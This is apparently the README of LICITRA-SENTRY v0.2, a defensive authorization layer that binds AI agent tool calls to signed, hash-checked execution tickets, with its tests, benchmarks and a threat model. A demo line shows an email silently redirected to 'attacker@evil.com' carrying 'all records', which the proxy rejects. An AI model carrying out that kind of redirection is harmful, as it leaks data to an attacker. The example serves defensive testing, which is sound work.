# LICITRA-SENTRY v0.2

[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.18860290.svg)](https://doi.org/10.5281/zenodo.18860290)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-security--research-blue)]()
[![Python](https://img.shields.io/badge/python-3.10%2B-blue)]()
[![Tests](https://img.shields.io/badge/tests-13%2F13%20pass-brightgreen)]()
[![Experiments](https://img.shields.io/badge/experiments-10%2F10%20pass-brightgreen)]()

**LICITRA-SENTRY is a runtime enforcement layer for AI agents that cryptographically binds authorization decisions to the exact request executed by a tool.**

SENTRY is an open-source pre-execution authorization pipeline that enforces identity, content, semantic contracts, and authority before any agent action executes. Every decision — approved or rejected — is committed to an append-only hash-chained audit ledger and may be witnessed by an independent transparency log.

---

## Core Security Invariant

SENTRY enforces the following property for every agent tool execution:

```text
H(authorized_request) = H(executed_request)
```

If the request reaching the tool differs from the request approved by the authorization pipeline, execution is rejected.

**This prevents:**

- Payload modification after authorization — changing a recipient, amount, or parameter
- Execution ticket replay — reusing a previously valid authorization
- Unauthorized tool invocation — no valid ticket, no execution
- Delegation privilege escalation — delegated agents bounded by delegator permissions

---

## Why This System Exists

Most AI security tooling focuses on model behavior testing: prompt injection testing, jailbreak detection, LLM red-teaming. Those answer: *Can the model be tricked?*

Production agent systems must answer a different question:

> **Did the system execute exactly what was authorized?**

Current agent frameworks often dispatch tool calls directly from the agent runtime. Most current agent frameworks do not cryptographically bind authorization decisions to execution. If a request is modified between policy evaluation and tool invocation, most systems do not detect it.

SENTRY provides the missing enforcement layer: **cryptographic proof that the authorized request is the executed request.**

---

## Architecture

<p align="center">
  <img src="docs/architecture.png" width="850">
</p>

*Figure 1 — LICITRA-SENTRY authorization pipeline enforcing complete mediation for AI agent tool execution. Every tool invocation traverses the full pipeline. If any gate rejects, execution is denied and the rejection is committed to the audit ledger.*

---

## API Versions

LICITRA-SENTRY currently exposes two API surfaces.

### v0.2 Core Runtime API

This is the primary architecture implementing the Chain-of-Intent authorization pipeline.

**Core components:**

- **IdentityVerifier** — Gate 1 identity verification
- **ContentInspector** — Gate 2 content inspection
- **SemanticContract / ContractValidator** — Gate 3 semantic policy enforcement
- **AuthorityEnforcer** — Gate 4 permission and delegation control
- **SentryOrchestrator** — end-to-end authorization pipeline
- **ExecutionTicket** — Ed25519-signed execution authorization
- **ToolProxy** — mandatory mediation for tool execution
- **AuditBridge** — append-only audit commit and epoch anchoring
- **WitnessClient / WitnessVerifier** — external verifiability layer

The v0.2 API represents the stable runtime enforcement architecture.

### v0.1 Compatibility API (Legacy)

The repository also contains a v0.1 compatibility layer retained for experiment reproducibility and migration support.

Legacy components include: `CovenantNotary`, `SignedToken`, `AgenticSafetyContract`, and legacy PowerShell compatibility tests under `tests/legacy/`.

These remain for backward compatibility and research reproducibility. New integrations should use the v0.2 runtime API.

---

## What's New in v0.2

- **Execution Ticket System:** Ed25519-signed tickets cryptographically bind authorization decisions to exact request payloads.
- **Tool Proxy Gateway:** Mandatory mediation layer — no tool execution without a valid ticket.
- **Replay Protection:** SQLite-backed JTI tracking prevents ticket reuse.
- **Witnessed Transparency Layer:** Signed Inclusion Receipts from an independent witness — external auditors verify without trusting the operator.
- **Security Hardening:** Rate limiting, payload size limits, content inspection patterns.
- **Audit Linkage:** Authorization decisions are bound to audit records through `mmr_commit_id`.

---

## Quick Start

```bash
pip install -r requirements.txt

# Run authoritative v0.2 tests
powershell tests/run_all_tests.ps1

# Run runtime experiments
python experiments/run_all_experiments.py

# Run benchmarks
python experiments/benchmark_suite.py

# Run demos
python demo_ticket_execution.py
python demo_witness.py
```

---

## Demo: Security Properties in Action

### Payload Modification Attack

```text
Authorized:  send_email(to=alice@example.com, body="quarterly report")
Modified:    send_email(to=attacker@evil.com, body="send all records")

Result:      Proxy rejected - request hash mismatch
```

### Replay Attack

```text
Ticket used:    send_email (ticket jti=abc-123)
Ticket reused:  send_email (ticket jti=abc-123)

Result:         Proxy rejected - JTI already used
```

### Delegation Escalation

```text
Agent-alpha:  permitted tools = [email-sender, db-reader]
Agent-beta:   delegated from alpha, own contract = [db-reader]

Agent-beta requests email-sender:
Result:       Authorization rejected - outside contract scope
```

### Operator History Rewrite

```text
Epoch root witnessed:  a3f8b2c1...
Operator rewrites to:  9x7k4m2p...

Auditor verification:  Digest mismatch with witness receipt
```

---

## Threat Model

| Scenario | Without Witnesses | With Witnesses |
|---|---|---|
| DB tampering | Detectable if keys intact and operator honest | Detectable even under operator compromise |
| History rewrite | Operator can potentially rewrite history undetected | Detectable unless the operator and witness infrastructure collude or no external monitoring observes divergence |
| External audit | Relies on operator trust | Independent verification possible |

---

## Test Suite (13 Security Tests)

The primary v0.2 validation suite is executed through:

```bash
powershell -ExecutionPolicy Bypass -File .\tests\run_all_tests.ps1
```

It runs two test modules:

- `test_sentry_v02.py` — E01 to E08 runtime enforcement validation
- `test_witness.py` — E09 to E13 witness transparency validation

### Runtime Enforcement Tests

| ID | Scenario | Security Property Validated |
|---|---|---|
| E01 | Authorized ticket flow | Full pipeline → ticket → proxy → execute |
| E02 | Proxy bypass attempt | Execution requires valid Ed25519 signature |
| E03 | Replay attack | JTI uniqueness prevents ticket reuse |
| E04 | Payload modification | SHA-256 hash binding detects changes |
| E05 | Expired ticket | 60-second TTL enforced |
| E06 | Delegation escalation | Permission intersection prevents escalation |
| E07 | PII exfiltration | Content inspection blocks SSN/CC patterns |
| E08 | Audit chain integrity | Hash chain verified across all events |

### Witness Transparency Tests

| ID | Scenario | Security Property Validated |
|---|---|---|
| E09 | Epoch witnessed | Receipt issued and validated |
| E10 | Operator rewrite detected | Tampered root mismatches witness receipt |
| E11 | Auditor verification | Evidence bundle verified independently |
| E12 | Tampered receipt rejected | Forged witness signature detected |
| E13 | Chain break detected | Modified epoch chain flagged |

### Legacy Compatibility Tests

Older compatibility tests have been moved to `tests/legacy/`. These are retained only for backward compatibility and historical reference. They are not the authoritative v0.2 validation suite.

---

## Experiment Suite (10 Runtime Security Experiments)

The runtime experiment suite is executed through:

```bash
python experiments/run_all_experiments.py
```

| ID | Scenario | Security Property |
|---|---|---|
| EXP-01 | Authorized execution path | Full pipeline success |
| EXP-02 | Contract rejection | Semantic policy enforcement |
| EXP-03 | Identity expiration | Credential validity enforcement |
| EXP-04 | Relay injection attack | Unauthorized execution blocked |
| EXP-05 | PII exfiltration attempt | Content inspection protection |
| EXP-06 | Unauthorized delegation | Delegation privilege bounds |
| EXP-07 | End-to-end MMR proof validation | Cryptographic audit commitment |
| EXP-08 | Ticket replay attack | JTI replay protection |
| EXP-09 | Payload tampering | Request hash binding |
| EXP-10 | Audit tampering attempt | Hash-chain integrity detection |

---

## Performance Benchmarks

```bash
python experiments/benchmark_suite.py
```

Current benchmark results from `experiments/benchmark_results.json`:

| Benchmark | Result |
|---|---|
| Sequential full pipeline | 221 requests/sec |
| Concurrent full pipeline | 329 requests/sec |
| Replay second execution | rejected |
| Payload tampering | rejected |

**Latency summary:**

| Metric | Sequential | Concurrent |
|---|---|---|
| p50 | 4.352 ms | 60.087 ms |
| p95 | 5.850 ms | 66.833 ms |
| p99 | 7.450 ms | 79.836 ms |

Benchmarks were executed on a local development environment using Python 3.12 on Windows.

---

## Evidence Artifacts

Experiment evidence artifacts are stored under `experiments/evidence/`.

Example artifact bundle:

```text
experiments/evidence/exp07_e2e_mmr_proof/
  evidence.json
  evidence.pdf
  experiment_output.json
```

These artifacts support reproducibility, external verification, and research evidence packaging.

---

## Witnessed Transparency Layer

Every N audit events, an epoch finalizes and is submitted to an independent transparency log.

**What gets witnessed:**

- `epoch_root` — current audit state root
- `prev_epoch_root` — chain link to previous epoch
- `policy_hash` — SHA-256 of active policy bundle
- `sentry_build_hash` — build identifier of running code
- `event_count`, `timestamp`, `operator_id`

**What comes back:**

- Signed Inclusion Receipt (Ed25519, separate key from SENTRY)
- Log sequence number
- Log timestamp

**Auditor workflow:**

1. Receive evidence bundle (epoch records + receipts)
2. Receive transparency log public key
3. Run `WitnessVerifier`
4. Verify signatures, digests, and chain continuity without trusting the operator

---

## Execution Ticket Protocol

Each ticket contains:

| Field | Purpose |
|---|---|
| `sub` | Agent identity |
| `aud` | Target tool |
| `jti` | Unique ticket ID (replay protection) |
| `exp` | Expiration (max 60s TTL) |
| `request_hash` | SHA-256 of canonicalized request |
| `policy_version` | Policy version at authorization time |
| `contract_id` | Semantic contract evaluated |
| `contract_version` | Semantic contract version |
| `mmr_commit_id` | Audit ledger commit identifier |

Modifying any byte of the request after authorization invalidates the hash. The proxy rejects it.

---

## Attacks Prevented

- **Unauthorized tool invocation** — no valid ticket, no execution (E02 / EXP-04)
- **Payload modification** — hash mismatch detected (E04 / EXP-09)
- **Ticket replay** — JTI already used (E03 / EXP-08)
- **Privilege escalation via delegation** — contract + authority bounds (E06 / EXP-06)
- **PII/credential exfiltration** — content inspection blocks patterns (E07 / EXP-05)
- **Audit tampering** — hash chain detects modification (E08 / EXP-10)
- **Expired authorization** — TTL enforced (E05 / EXP-03)
- **Operator history rewrite** — witness receipt contradicts tampered epoch (E10)

## Attacks NOT Prevented

- Full witness collusion
- Semantic bypass of regex-based content inspection
- Authorization key compromise
- Compromised tool behavior after valid execution
- Immediate ticket revocation before expiry
- Adversarial load attacks beyond current benchmark scope
- Decision correctness itself — SENTRY guarantees `authorized_request == executed_request`, not that every authorized request is inherently safe

---

## Position in the AI Security Stack

| Layer | Example Tools | Purpose |
|---|---|---|
| Model testing | Promptfoo, Garak | Detect prompt vulnerabilities |
| Policy evaluation | Guardrails, Cedar, OPA | Check whether a request should be allowed |
| Runtime enforcement | **LICITRA-SENTRY** | Guarantee authorized request = executed request |
| Audit transparency | CT logs, Sigstore | Provide verifiable history |

---

## OWASP Agentic Top 10 Mapping

| ASI Category | SENTRY Control | Effectiveness |
|---|---|---|
| ASI01: Agent Goal Hijack | Semantic contract limits scope | Partial |
| ASI02: Tool Misuse | Ticket request hash + content inspection | Strong |
| ASI03: Identity & Privilege Abuse | Identity + authority with delegation bounds | Strong |
| ASI04: Supply Chain | Identity rejects unregistered components | Partial |
| ASI05: Unexpected Code Execution | Content inspection + contract | Moderate |
| ASI06: Memory & Context Poisoning | Hash-chained audit + witness receipts | Strong |
| ASI07: Insecure Inter-Agent Communication | Identity at every boundary + audit | Moderate |
| ASI08: Cascading Failures | Per-gate audit for failure tracing | Moderate |
| ASI09: Human-Agent Trust Exploitation | Authorization committed as verifiable artifacts | Strong |
| ASI10: Rogue Agents | Contract + authority + audit trail | Moderate |

---

## Project Structure

```text
licitra-sentry/
├── app/                              # Core runtime authorization system
│   ├── identity.py                   # Gate 1: Agent identity verification
│   ├── content_inspector.py          # Gate 2: Content inspection (PII, injection)
│   ├── contract.py                   # Gate 3: Semantic contract validation
│   ├── authority.py                  # Gate 4: Authority + delegation enforcement
│   ├── audit_bridge.py               # Gate 5: Audit ledger integration
│   ├── orchestrator.py               # Chain-of-Intent pipeline orchestration
│   ├── key_manager.py                # Ed25519 key management
│   ├── ticket.py                     # Execution ticket issuance and signing
│   ├── tool_proxy.py                 # Mandatory mediation gateway
│   ├── witness.py                    # Witnessed transparency layer
│   └── anchor.py                     # External anchoring interface
│
├── tests/                            # Authoritative runtime validation
│   ├── test_sentry_v02.py            # E01-E08 runtime enforcement tests
│   ├── test_witness.py               # E09-E13 witness transparency tests
│   ├── run_all_tests.ps1             # Test runner
│   └── legacy/                       # Legacy compatibility tests (v0.1 era)
│
├── experiments/                      # Security experiments and benchmarks
│   ├── run_all_experiments.py
│   ├── benchmark_suite.py
│   ├── benchmark_results.json
│   ├── run_exp01_happy_path.py
│   ├── run_exp02_contract_rejection.py
│   ├── run_exp03_identity_expiry.py
│   ├── run_exp04_relay_injection.py
│   ├── run_exp05_pii_exfiltration.py
│   ├── run_exp06_unauthorized_delegation.py
│   ├── run_exp07_e2e_mmr_proof.py
│   ├── run_exp08_ticket_replay.py
│   ├── run_exp09_payload_tampering.py
│   ├── run_exp10_audit_tampering.py
│   └── evidence/                     # Reproducible experiment artifacts
│
├── docs/
│   └── architecture.png
│
├── paper/
│   ├── licitra_sentry_TR-2026-02_v0.1_FINAL.tex   # v0.1 technical report (included for reference)
│   └── licitra_sentry_TR-2026-02_v0.1_FINAL.pdf   # v0.1 technical report (included for reference)
│
├── demo_ticket_execution.py          # Execution ticket demo
├── demo_witness.py                   # Witness transparency demo
├── demo_swarm.py                     # Multi-agent orchestration demo
├── content_rules.yaml
├── requirements.txt
├── pyproject.toml
├── CHANGELOG.md
├── MIGRATION.md
├── SECURITY.md
├── LICITRA_SENTRY_Evidence_Report.pdf
└── LICENSE
```

---

## Citation

If you use LICITRA-SENTRY in research, please cite:

```bibtex
@misc{licitra_sentry_v02,
  author = {Narendra Kumar Nutalapati},
  title = {LICITRA-SENTRY v0.2: Execution Ticket System and Witnessed Transparency for Agentic AI Authorization},
  year = {2026},
  doi = {10.5281/zenodo.18860290},
  url = {https://github.com/narendrakumarnutalapati/licitra-sentry}
}
```

---

## References

**Published:**

- [LICITRA-SENTRY v0.2 — Zenodo](https://doi.org/10.5281/zenodo.18860290)
- [OWASP Top 10 for Agentic Applications (2026)](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [OWASP Issue #802 — Runtime Enforcement Mapping](https://github.com/OWASP/www-project-top-10-for-large-language-model-applications/issues/802)

**Repository artifacts:**

- [LICITRA-SENTRY v0.1 Technical Report (included for reference)](paper/licitra_sentry_TR-2026-02_v0.1_FINAL.pdf) — the repository implements v0.2; the included paper documents the earlier v0.1 architecture

---

## License

MIT License

---

## Author

**Narendra Kumar Nutalapati**

- GitHub: [narendrakumarnutalapati](https://github.com/narendrakumarnutalapati)
- LinkedIn: [narendralicitra](https://www.linkedin.com/in/narendralicitra)
